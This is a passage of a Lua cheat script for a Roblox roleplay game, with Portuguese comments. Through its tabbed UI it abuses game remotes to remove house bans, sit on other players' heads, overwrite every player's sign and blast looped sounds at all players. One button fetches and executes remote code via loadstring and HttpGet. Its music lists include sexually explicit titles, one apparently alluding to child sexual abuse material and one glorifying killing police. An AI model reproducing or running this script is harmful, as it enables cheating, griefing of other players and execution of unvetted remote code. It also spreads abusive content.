            local bannedBlockName = "BannedBlock" .. i
            local bannedBlock = Workspace:FindFirstChild(bannedBlockName, true)
            if bannedBlock then
                local success, _ = pcall(function()
                    bannedBlock:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        for _, house in pairs(Workspace:GetDescendants()) do
            if house.Name:match("BannedBlock") then
                local success, _ = pcall(function()
                    house:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        if successCount > 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Sucesso",
                Text = "Bans removidos de " .. successCount .. " casas!",
                Duration = 5
            })
        end
        if failCount > 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Aviso",
                Text = "Falha ao remover bans de " .. failCount .. " casas.",
                Duration = 5
            })
        end
        if successCount == 0 and failCount == 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Aviso",
                Text = "Nenhum ban encontrado para remover.",
                Duration = 5
            })
        end
    end
})
HouseTab:AddSection({"Props"})
local player = game.Players.LocalPlayer

HouseTab:AddToggle({
    Name = "Disable Prop Spawn",
    Default = false,
    Callback = function(value)
        local args = { value } -- passa true ou false dependendo do toggle
        local success, err = pcall(function()
            workspace:WaitForChild("001_Lots")
                :WaitForChild(player.Name.."House")
                :WaitForChild("HousePickedByPlayer")
                :WaitForChild("HouseModel")
                :WaitForChild("Permissions:SetPropPlacementBlockedForOthers")
                :InvokeServer(unpack(args))
        end)
        if not success then
            warn("Não foi possível alterar o bloqueio de props:", err)
        end
    end
})
local player = game.Players.LocalPlayer

HouseTab:AddButton({
    Name = "Delete All Props",
    Callback = function()
        local success, err = pcall(function()
            workspace:WaitForChild("001_Lots")
                :WaitForChild(player.Name.."House")
                :WaitForChild("HousePickedByPlayer")
                :WaitForChild("HouseModel")
                :WaitForChild("Permissions:ClearProps")
                :InvokeServer()
        end)
        if not success then
            warn("Não foi possível limpar os props:", err)
        end
    end
})
HouseTab:AddSection({"Loop Scripts"})
local loopGarage = false

HouseTab:AddToggle({
    Name = "Loop Garage",
    Default = false,
    Callback = function(value)
        loopGarage = value

        if loopGarage then
            task.spawn(function()
                while loopGarage do
                    local args = {
                        "GarageDoor"
                    }

                    game:GetService("ReplicatedStorage")
                        :WaitForChild("RE")
                        :WaitForChild("1Player1sHous1e")
                        :FireServer(unpack(args))

                    task.wait(7)
                end
            end)
        end
    end
})

local FunT = Window:MakeTab({"Fun Players", "fun"})
FunT:AddSection({ "Fun Players" })


local Section = FunT:AddSection({

    Name = "Head Sit"

})



local selectedHeadSit = nil

local headSitConnection = nil



local pl = game.Players.LocalPlayer

local players = {}



local function updatePlayerList()

    players = {}

    for _, player in pairs(game.Players:GetPlayers()) do

        table.insert(players, player.Name)

    end

    return players

end



updatePlayerList()



local headSitDropdown = FunT:AddDropdown({

    Name = "Select a Player",

    Default = "",

    Options = players,

    Callback = function(Value)

        selectedHeadSit = Value

    end

})



FunT:AddToggle({

    Name = "Head Sit",

    Default = false,

    Callback = function(bool)

        local player = game.Players.LocalPlayer

        local character = player.Character or player.CharacterAdded:Wait()

        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local humanoid = character:WaitForChild("Humanoid")



        if not selectedHeadSit or selectedHeadSit == "" then

            return false

        end



        local selectedPlayer = game.Players:FindFirstChild(selectedHeadSit)



        if bool then

            if selectedPlayer and selectedPlayer.Character then

                humanoid.Sit = true



                if headSitConnection then

                    headSitConnection:Disconnect()

                end



                headSitConnection = game:GetService("RunService").Heartbeat:Connect(function()

                    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") and humanoid.Sit then

                        local targetHead = selectedPlayer.Character.Head

                        humanoidRootPart.CFrame = targetHead.CFrame * CFrame.Angles(0, 0, 0) * CFrame.new(0, 1.6, 0.4)

                    else

                        if headSitConnection then

                            headSitConnection:Disconnect()

                            headSitConnection = nil

                            humanoid.Sit = false

                        end

                    end

                end)

            else

                return false

            end

        else

            if headSitConnection then

                headSitConnection:Disconnect()

                headSitConnection = nil

            end

            humanoid.Sit = false

        end

    end

})



FunT:AddButton({

    Name = "Update Player List",

    Callback = function()

        local updatedPlayers = updatePlayerList()

        if headSitDropdown and updatedPlayers then

            pcall(function()

                headSitDropdown:Refresh(updatedPlayers)

            end)

            if selectedHeadSit and not game.Players:FindFirstChild(selectedHeadSit) then

                selectedHeadSit = nil

                pcall(function()

                    headSitDropdown:Set("")

                end)

            end

        end

    end

})

local Section2 = FunT:AddSection({

    Name = "Placa"

})

local texto = ""

local function trocaplaca(all, txt)
if all then
for _,v in next, game:GetService("Players"):GetPlayers() do
if v.Character and v.Character:FindFirstChild("Sign") then
v.Character:FindFirstChild("Sign").ToolSound:FireServer("Sign", "SignWords", txt)
end
end
else
if selectedHeadSit.Character and selectedHeadSit.Character:FindFirstChild("Sign") then
selectedHeadSit.Character:FindFirstChild("Sign").ToolSound:FireServer("Sign", "SignWords", txt)
end
end
end

FunT:AddTextBox({
    Name = "Texto",
    PlaceholderText = "Texto da placa",
    Callback = function(value)
        texto = value
    end
})

FunT:AddButton({
    Name = "Placa troca all",
    Callback = function(value)
        trocaplaca(true, texto)
    end
})

local Section = FunT:AddSection({"Browser"})

FunT:AddButton({
    Name = "Browser by Phantom Client - It doesn't work on Delta.",
    Callback = function()
        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/09WI0rdvCDdDuIHd/raw"))()
    end
})


local Tab = Window:MakeTab({"Avatar", "rbxassetid://10734952036"})



Tab:AddSection({ Name = "Avatar" })



Tab:AddSection({ Name = "Copy Avatar" })

local Players = game:GetService("Players")

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Remotes = ReplicatedStorage:WaitForChild("Remotes")



local Target = nil



local function GetPlayerNames()

    local PlayerNames = {}

    for _, player in ipairs(Players:GetPlayers()) do

        table.insert(PlayerNames, player.Name)

    end

    return PlayerNames

end



local Dropdown = Tab:AddDropdown({

    Name = "Select Player",

    Options = GetPlayerNames(),

    Default = Target,

    Callback = function(Value)

        Target = Value

    end

})



local function UpdateDropdown()

    Dropdown:Refresh(GetPlayerNames(), true)

end



Players.PlayerAdded:Connect(UpdateDropdown)

Players.PlayerRemoving:Connect(UpdateDropdown)

Tab:AddButton({

    Name = "Copy Avatar",

    Callback = function()

        if not Target then return end



        local LP = Players.LocalPlayer

        local LChar = LP.Character

        local TPlayer = Players:FindFirstChild(Target)



        if TPlayer and TPlayer.Character then

            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")

            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")



            if LHumanoid and THumanoid then

                local LDesc = LHumanoid:GetAppliedDescription()



                for _, acc in ipairs(LDesc:GetAccessories(true)) do

                    if acc.AssetId and tonumber(acc.AssetId) then

                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))

                        task.wait(0.2)

                    end

                end



                if tonumber(LDesc.Shirt) then

                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))

                    task.wait(0.2)

                end



                if tonumber(LDesc.Pants) then

                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))

                    task.wait(0.2)

                end



                if tonumber(LDesc.Face) then

                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))

                    task.wait(0.2)

                end



                local PDesc = THumanoid:GetAppliedDescription()



                local argsBody = {

                    [1] = {

                        [1] = PDesc.Torso,

                        [2] = PDesc.RightArm,

                        [3] = PDesc.LeftArm,

                        [4] = PDesc.RightLeg,

                        [5] = PDesc.LeftLeg,

                        [6] = PDesc.Head

                    }

                }

                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))

                task.wait(0.5)



                if tonumber(PDesc.Shirt) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))

                    task.wait(0.3)

                end



                if tonumber(PDesc.Pants) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))

                    task.wait(0.3)

                end



                if tonumber(PDesc.Face) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))

                    task.wait(0.3)

                end



                for _, v in ipairs(PDesc:GetAccessories(true)) do

                    if v.AssetId and tonumber(v.AssetId) then

                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))

                        task.wait(0.3)

                    end

                end



                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")

                if SkinColor then

                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))

                    task.wait(0.3)

                end



                if tonumber(PDesc.IdleAnimation) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))

                    task.wait(0.3)

                end



                local Bag = TPlayer:FindFirstChild("PlayersBag")

                if Bag then

                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then

                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)

                        task.wait(0.3)

                    end

                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then

                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)

                        task.wait(0.3)

                    end

                    if Bag:FindFirstChild("RPNameColor") then

                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)

                        task.wait(0.3)

                    end

                    if Bag:FindFirstChild("RPBioColor") then

                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)

                        task.wait(0.3)

                    end

                end

            end

        end

    end

})

Tab:AddSection({ "Character" })

local colors = { "Bright red", "Lime green", "Bright blue", "Bright yellow", "Bright cyan", "Hot pink", "Royal purple" }

local rgbEnabled = false



local function changeColor(color)

    local args = { color }

    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))

end



local function toggleRGBCharacter(enabled)

    rgbEnabled = enabled

    if rgbEnabled then

        while rgbEnabled do

            for _, color in ipairs(colors) do

                if not rgbEnabled then return end

                changeColor(color)

                wait(0.5)

            end

        end

    end

end

Tab:AddToggle({

    Name = "RGB Character",

    Description = "Make your character RGB",

    Default = false,

    Callback = function(value)

        toggleRGBCharacter(value)

    end

})

local Tab = Window:MakeTab({"Morphs", "apple"})

Tab:AddButton({

    Name = "Mini avatar",

    Callback = function()

    local args = {
    212241661914186
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "esquilo",

    Callback = function()

    local args = {
    241411408629426
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "homem musculoso",

    Callback = function()

    local args = {
    223216648264193
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "Meme",

    Callback = function()

    local args = {
    136405109146878
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "gordin safado",

    Callback = function()

    local args = {
    256720272548506
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "gatin fofo",

    Callback = function()

    local args = {
    44188585559836
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "patrick",

    Callback = function()

    local args = {
    182360470975588
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "foguinho",

    Callback = function()

    local args = {
    149380187421681
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

Tab:AddButton({

    Name = "gatinho cosmico",

    Callback = function()

    local args = {
    35148541344467
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))

end

})

local TabSound = Window:MakeTab({"Sound All", "box"})


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Função para tocar som globalmente via Remote
local function tocarGlobalmente(soundId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local args = {
                [1] = hrp,
                [2] = hrp,
                [3] = Vector3.new(0, -1, 0),
                [4] = Vector3.new(0, 0, 0),
                [5] = hrp,
                [6] = hrp,
                [7] = tostring(soundId),
                [8] = tostring(soundId),
                [9] = { [1] = true },
                [10] = {
                    [1] = 25,
                    [2] = Vector3.new(0.25, 0.25, 100),
                    [3] = BrickColor.new(24),
                    [4] = 0.25,
                    [5] = Enum.Material.SmoothPlastic,
                    [6] = 0.25
                },
                [11] = true,
                [12] = false
            }

            local remote = ReplicatedStorage:FindFirstChild("RE")
            if remote and remote:FindFirstChild("1Gu1n") then
                pcall(function()
                    remote["1Gu1n"]:FireServer(unpack(args))
                end)
            end
        end
    end
end

-- Variáveis
local loopAtivo = false
local InputID = ""

-- TextBox para inserir o ID
TabSound:AddTextBox({
    Name = "Insira o ID Audio All",
    Description = "Digite o ID do som que deseja tocar globalmente",
    PlaceholderText = "Exemplo: 1234567890",
    ClearTextOnFocus = true,
    Callback = function(text)
        InputID = tonumber(text)
    end
})

-- Botão para tocar o som
TabSound:AddButton({
    Name = "Tocar Som Global",
    Description = "Toca o áudio para todos os jogadores",
    Callback = function()
        if InputID then
            tocarGlobalmente(InputID)

            local globalSound = Instance.new("Sound")
            globalSound.Parent = Workspace
            globalSound.SoundId = "rbxassetid://" .. InputID
            globalSound.Volume = 3
            globalSound.Looped = false
            globalSound:Play()

            task.delay(5, function()
                globalSound:Destroy()
            end)
        end
    end
})

-- Toggle de Loop Global
TabSound:AddToggle({
    Name = "Loop Global",
    Description = "Repetir som globalmente",
    Default = false,
    Callback = function(state)
        loopAtivo = state
        if loopAtivo then
            task.spawn(function()
                while loopAtivo do
                    if InputID then
                        tocarGlobalmente(InputID)

                        local globalSound = Instance.new("Sound")
                        globalSound.Parent = Workspace
                        globalSound.SoundId = "rbxassetid://" .. InputID
                        globalSound.Volume = 3
                        globalSound.Looped = false
                        globalSound:Play()

                        task.delay(5, function()
                            globalSound:Destroy()
                        end)
                    end
                    task.wait(3)
                end
            end)
        end
    end
})

TabSound:AddSection({ "memes-" })

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Função para tocar som globalmente via Remote
local function tocarGlobalmente(soundId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local args = {
                [1] = hrp,
                [2] = hrp,
                [3] = Vector3.new(0, -1, 0),
                [4] = Vector3.new(0, 0, 0),
                [5] = hrp,
                [6] = hrp,
                [7] = tostring(soundId),
                [8] = tostring(soundId),
                [9] = { [1] = true },
                [10] = {
                    [1] = 25,
                    [2] = Vector3.new(0.25, 0.25, 100),
                    [3] = BrickColor.new(24),
                    [4] = 0.25,
                    [5] = Enum.Material.SmoothPlastic,
                    [6] = 0.25
                },
                [11] = true,
                [12] = false
            }

            local remote = ReplicatedStorage:FindFirstChild("RE")
            if remote and remote:FindFirstChild("1Gu1n") then
                pcall(function()
                    remote["1Gu1n"]:FireServer(unpack(args))
                end)
            end
        end
    end
end

-- Lista completa de sons de memes
local sonsMemes = {
    {name = "Trollface laugh", id = "73753120048787"},
    {name = "troll face sussy", id = "9098738774"},
    {name = "troll cut", id = "8389041427"},
    {name = "troll transition", id = "7705506391"},
    {name = "troll laugh", id = "7816195044"},
    {name = "Magic2", id = "9066733515"},
    {name = "homero brasileo", id = "115224076671067"},
    {name = "LOUD Youve been trolled", id = "6787686247"},
    {name = "Fart Meme Sound", id = "6454805792"},
    {name = "Metal Rattle 2 SFX", id = "9116788555"},
    {name = "Hentai wiaaaaan", id = "88332347208779"},
    {name = "iamete cunasai", id = "108494476595033"},
    {name = "dodichan onnn...", id = "134640594695384"},
    {name = "Toma jack", id = "132603645477541"},
    {name = "Toma jackV2", id = "100446887985203"},
    {name = "Toma jack no sol quente", id = "97476487963273"},
    {name = "ifood", id = "133843750864059"},
    {name = "pelo geito ela ta querendo ram", id = "94395705857835"},
    {name = "lula vai todo mundo", id = "136804576009416"},
    {name = "coringa", id = "84663543883498"},
    {name = "shoope", id = "8747441609"},
    {name = "quenojo", id = "103440368630269"},
    {name = "sai dai lava prato", id = "101232400175829"},
    {name = "se e loko numconpeça", id = "78442476709262"},
    {name = "mita sequer que eu too uma", id = "94889439372168"},
    {name = "Hoje vou ser tua mulher e tu", id = "90844637105538"},
    {name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582"},
    {name = "miau", id = "131804436682424"},
    {name = "skibidi", id = "128771670035179"},
    {name = "BIRULEIBI", id = "121569761604968"},
    {name = "sai", id = "121169949217007"},
    {name = "risada boa dms", id = "127589011971759"},
    {name = "vacilo perna de pau", id = "106809680656199"},
    {name = "gomo gomo no!!!", id = "137067472449625"},
    {name = "arroto", id = "140203378050178"},
    {name = "iraaaa", id = "136752451575091"},
    {name = "não fica se achando muito não", id = "101588606280167"},
    {name = "WhatsApp notificação", id = "107004225739474"},
    {name = "Samsung", id = "123767635061073"},
    {name = "Shiiii", id = "120566727202986"},
    {name = "ai_tomaa miku", id = "139770074770361"},
    {name = "kuru_kuru", id = "122465710753374"},
    {name = "PM ROCAM", id = "96161547081609"},
    {name = "cavalo!!", id = "78871573440184"},
    {name = "deixa os garoto brinca", id = "80291355054807"},
    {name = "flamengo", id = "137774355552052"},
    {name = "sai do mei satnas", id = "127944706557246"},
    {name = "namoral agora e a hora", id = "120677947987369"},
    {name = "n pode me chutar pq seu celebro e burro", id = "82284055473737"},
    {name = "vc ta fudido vou te pegar", id = "120214772725166"},
    {name = "deley", id = "102906880476838"},
    {name = "Tu e um beta", id = "130233956349541"},
    {name = "Porfavor n tira eu nao", id = "85321374020324"},
    {name = "Olá beleza vc pode me dá muitos", id = "74235334504693"},
    {name = "Discord sus", id = "122662798976905"},
    {name = "rojao apito", id = "6549021381"},
    {name = "off", id = "1778829098"},
    {name = "Kazuma kazuma", id = "127954653962405"},
    {name = "sometourado", id = "123592956882621"},
    {name = "Estouradoespad", id = "136179020015211"},
    {name = "Alaku bommm", id = "110796593805268"},
    {name = "busss", id = "139841197791567"},
    {name = "Estourado wItb", id = "137478052262430"},
    {name = "sla", id = "116672405522828"},
    {name = "HA HA HA", id = "138236682866721"}
}

-- Preparar dropdown
local nomesSons = {}
local mapaSons = {}
for _, v in ipairs(sonsMemes) do
    table.insert(nomesSons, v.name)
    mapaSons[v.name] = v.id
end

local loopDropdownAtivo = false
local somSelecionado = nil

-- Cria dropdown
TabSound:AddDropdown({
    Name = "Memes Sons Globais",
    Description = "Escolha um som para tocar globalmente",
    Default = nomesSons[1],
    Options = nomesSons,
    Callback = function(valor)
        somSelecionado = mapaSons[valor]
    end
})

-- Botão de tocar som
TabSound:AddButton({
    Name = "Tocar Som Selecionado",
    Description = "Toca o som globalmente",
    Callback = function()
        if somSelecionado then
            tocarGlobalmente(somSelecionado)
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://" .. somSelecionado
            s.Volume = 3
            s.Looped = false
            s.Parent = Workspace
            s:Play()
            task.delay(5, function() s:Destroy() end)
        end
    end
})

-- Toggle loop global
TabSound:AddToggle({
    Name = "Loop Som Global",
    Description = "Repete o som selecionado globalmente",
    Default = false,
    Callback = function(estado)
        loopDropdownAtivo = estado
        if loopDropdownAtivo then
            task.spawn(function()
                while loopDropdownAtivo do
                    if somSelecionado then
                        tocarGlobalmente(somSelecionado)
                        local s = Instance.new("Sound")
                        s.SoundId = "rbxassetid://" .. somSelecionado
                        s.Volume = 3
                        s.Looped = false
                        s.Parent = Workspace
                        s:Play()
                        task.delay(5, function() s:Destroy() end)
                    end
                    task.wait(1)
                end
            end)
        end
    end
})


local Tab = Window:MakeTab({"Music", "music"})

local function tocarMusica(id)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Rádio (ToolMusicText)
    local argsRadio = {
        [1] = "ToolMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack(argsRadio))
    
    -- Casa (PickHouseMusicText)
    local argsCasa = {
        [1] = "PickHouseMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(argsCasa))

    -- Carro (PickingCarMusicText)
    local argsCarro = {
        [1] = "PickingCarMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(argsCarro))

    -- Scooter (PickingScooterMusicText)
    local argsScooter = {
        [1] = "PickingScooterMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(argsScooter))
end

local function isValidMusicId(value)
    return value and value ~= "" and value ~= "Option 1" and not value:match("novas musica adds") and not value:match("musica brasil") and not value:match("musica do meu interece") and not value:match("musica dls por elas") and not value:match("meme abaixo") and not value:match("estourada")
end

Tab:AddTextBox({
    Name = "ID da música",
    PlaceholderText = "Digite o ID e pressione Enter",
    Callback = function(value)
        if value and value ~= "" then
            tocarMusica(tostring(value))
        end
    end
})

-- Dropdowns para Tab
local function createMusicDropdown(title, musicOptions, defaultOption)
    local musicNames = {}
    local categoryMap = {}
    for category, sounds in pairs(musicOptions) do
        for _, music in ipairs(sounds) do
            if music.name ~= "" then
                table.insert(musicNames, music.name)
                categoryMap[music.name] = {id = music.id, category = category}
            end
        end
    end

    local function playMusic(soundId)
        tocarMusica(tostring(soundId)) -- Usa a função tocarMusica para tocar em todos os contextos
    end

    Tab:AddDropdown({
        Name = title,
        Description = "all",
        Default = defaultOption,
        Multi = false,
        Options = musicNames,
        Callback = function(selectedSound)
            if selectedSound and categoryMap[selectedSound] then
                local soundId = categoryMap[selectedSound].id
                if soundId and soundId ~= "" and soundId ~= "4354908569" then
                    playMusic(soundId)
                end
            end
        end
    })
end

-- Dropdown "Forro"
createMusicDropdown("Forro", {
    ["forro"] = {
        {name = "forro mt bom", id = "106412079335663"},
        {name = "lembranças", id = "111551362636063"},
        {name = "Passinho do barão", id = "127786586963377"},
        {name = "Bloquinho Macumbeira", id = "138345050819224"},
        {name = "eu já tava bem", id = "93590122047380"},
        {name = "PISEIRO ESTOURADO (20 sgds de intro)", id = "133190351316780"},
        {name = "forro ja cansou", id = "74812784884330"},
        {name = "GRELO E O FE", id = "72200166265935"},
        {name = "lenbro ate hoje", id = "71531533552899"},
        {name = "escolha certa", id = "107088620814881"},
        {name = "forro da rezenha", id = "120973520531216"},
        {name = "forro dudu", id = "74404168179733"},
        {name = "forro sao joao", id = "106364874935196"},
        {name = "forro engraçado paia", id = "76524290482399"},
        {name = "100% forro vaquejada", id = "92295159623916"},
        
        {name = "PASTOR MIRIM E A LÍNGUA DOS ANJOS", id = "71153532555470"},
        {name = "PARA NÃO ESQUECER QUEM SOMOS", id = "88937498361674"},
        {name = "Uno zero", id = "112959083808887"},
        {name = "Iate do neymar", id = "135738534706063"},
        {name = "Batidao na aldeia", id = "79953696595578"},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Musicas e Memes Aleatorio"
createMusicDropdown("Musicas e Memes Aleatorio", {
    ["forro"] = {
        {name = "desca dai seu corno", id = "119738878921996"},
        {name = "GTA ESTOURADO", id = "109337680029292"},
        {name = "ANXIETY (Amapiano Re-fix)", id = "101483901475189"}, 
        {name = "Meu corpo, minhas regras", id = "127587901595282"},
        {name = "Megalovania but its only the melodies", id = "104500091160463"},
        {name = "androphono strikes back", id = "78312089943968"},
        {name = "Bamm Bamm", id = "128730685516895"},
        {name = "longe de mais", id = "124478512057763"},
        {name = "Garoto de Copacabana", id = "135648634110254"},
        {name = "CELL!", id = "117634275895085"},
        {name = "Boa vibe em Ubatuba", id = "139059061493558"},
        {name = "SLIP AWAY", id = "126152928520174"},
        {name = "Alone in Motion", id = "122379348696948"},
        {name = "Fade Away", id = "81002139735874"},
        {name = "Wounds & Wishes", id = "109347979566607"},
        {name = "Ascensão do Monarca", id = "101864243033211"},
        {name = "carro do ovo", id = "3148329638"},
        {name = "ingles bus (fling ou kill bus)", id = "123268013026823"},
        {name = "MIKU MIKU HATSUNE", id = "112783541496955"},
        {name = "Escalando a Seleção Brasileira para a Copa", id = "116546457407236"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Funk"
createMusicDropdown("Funk", {
    ["Funk"] = {
        {name = "Meu Hd Chei De Cp", id = "118351471702293"},
        {name = "sla", id = "134763052215450"},
        {name = "tls", id = "126036553384258"},
        {name = "hoje eu acordei", id = "127870629973068"},
        {name = "aquela sister", id = "97708834121472"},
        {name = "set mc mn funk", id = "78631447496051"},
        {name = "tô com o piru desgovernado", id = "115837046053738"},
        {name = "eu tô doida pra te dar", id = "11505819302675"},
        {name = "eu não sou gay", id = "82816587043443"},
        {name = "i like trains", id = "94410505324605"},
        {name = "quem gosta de bucetão", id = "84434631780133"},
        {name = "vai mamar o bonde", id = "137888824649807"},
        {name = "sla", id = "92524227941055"},
        {name = "vem me fudendo", id = "136574160308808"},
        {name = "matar os policia e nossa meta", id = "72559750723073"},
        {name = "AURA!", id = "112984167725214"},
        {name = "Carnavel - mc mamãe", id = "96934467275534"},
        {name = "o sossego acabou", id = "125354466627612"},
        {name = "Uniao Flasco", id = "81628621752701"},
        {name = "ANALONG FUNK", id = "112214814544629"},
        {name = "LALALALA", id = "107314654399868"},
        {name = "BALINHA", id = "112406825739796"},
        {name = "Amor Hospitalar", id = "96259351729049"},
        {name = "Assobio Turbulento", id = "88975584625558"},
        {name = "Tentar", id = "131267110896054"},
        {name = "FUNK NARUTO", id = "89473100926016"},
        {name = "eu gosto de tu fy", id = "73937969824874"},
        {name = "MACET 2 FUNK", id = "97063553131882"},
        {name = "Não Trate a Natalia mal", id = "76860168288557"},
        {name = "ou ou ou", id = "126196231406971"},
        {name = "meca", id = "108226178439659"},
        {name = "antares", id = "122938948937941"},
        {name = "Piranha Piranha", id = "123238370098753"},
        {name = "Batida do Tal Do Tbt", id = "91007045451630"},
        {name = "comeno uma prkinha", id = "94214367115154"},
        {name = "soca na danada", id = "100337717591420"},
        {name = "desce talarica", id = "110363768678499"},
        {name = "RITMADA DE VILAO", id = "121405804171398"},
        {name = "Paredao morcegao", id = "138120757806690"},
        {name = "Jogo", id = "73198805524530"},
        {name = "BEM VINDO AO HELIPA", id = "94672348312515"},
        {name = "de sainha bem curtinha (40s intro)", id = "140655042547224"},
        {name = "Ajoelha", id = "127052251825619"},
        {name = "Eu não nasci pra trabalhar", id = "95197852052116"},
        {name = "BITCH!", id = "103288558732219"},
        {name = "arabe funk", id = "93451391025129"},
        {name = "PUXANDO CBL", id = "78631447496051"},
        {name = "REBOLA", id = "121046655523341"},
        {name = "JOGA NO PAI", id = "128011871344522"},
        {name = "RADINHO", id = "139693447546059"},
        {name = "ESTOURADAO KKKK", id = "86839065790068"},
        {name = "TIPO NINO", id = "140336018782383"},
        {name = "NINO PT2", id = "97708834121472"},
        {name = "EXCITADINHA? KKKK", id = "110176270788146"},
        {name = "BERIMBAU KK", id = "77712236704085"},
        {name = "NAT FUNK", id = "107416893652681"},
        {name = "MTG EXPLODE", id = "81384105684889"},
        {name = "envolvidão (15 sgds de intro)", id = "127775034804421"},
        {name = "RAIL GRIND ESTOURADOOO", id = "135958179501280"},
        {name = "CLYXAL X NYT", id = "100258273816054"},
        {name = "SENTA E RBL", id = "107513285979080"},
        {name = "chairy", id = "130071638363509"},
        {name = "Seu Pedreiro", id = "116272171755349"},
        {name = "fuga na viatura", id = "131891110268352"},
        {name = "funkphonk fumando verde", id = "112143944982807"},
        {name = "que que sharke", id = "129546408528391"},
        {name = "pre treino", id = "136869502216760"},
        {name = "CVRL", id = "124244582950595"},
        {name = "batida Brega Violino (Beat Brega Funk)", id = "99399643204701"},
        {name = "Dança do Canguru (Pke Gaz1nh)", id = "86876136192157"},
        {name = "MONTAGEM ARABIANA (Pke Gaz1nh)", id = "78076624091098"},
        {name = "Manda o papo (NGI)", id = "132642647937688"},
        {name = "Viver bem", id = "82805460494325"},
        {name = "Faixa estronda", id = "121187736532042"},
        {name = "Ritmo Pixelado", id = "93928823862203"},
        {name = "Viagem Sonora", id = "79349174602261"},
        {name = "Melodia Virtual", id = "139147474886402"},
        {name = "Melodia Serena", id = "97011217688307"},
        {name = "SENTA", id = "124085422276732"},
        {name = "crazy-lol", id = "106958630419629"},
        {name = "V7", id = "80348640826643"},
        {name = "UIUAH", id = "82894376737849"},
        {name = "meta ritmo", id = "110091098283354"},
        {name = "CAPPUCCINO ASSASSINO (SPEDUP)", id = "132733033157915"},
        {name = "haha (NGI)", id = "122114766584918"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Phonk"
createMusicDropdown("Phonk", {
    ["phonk"] = {
        {name = "wyles", id = "85385155970460"},
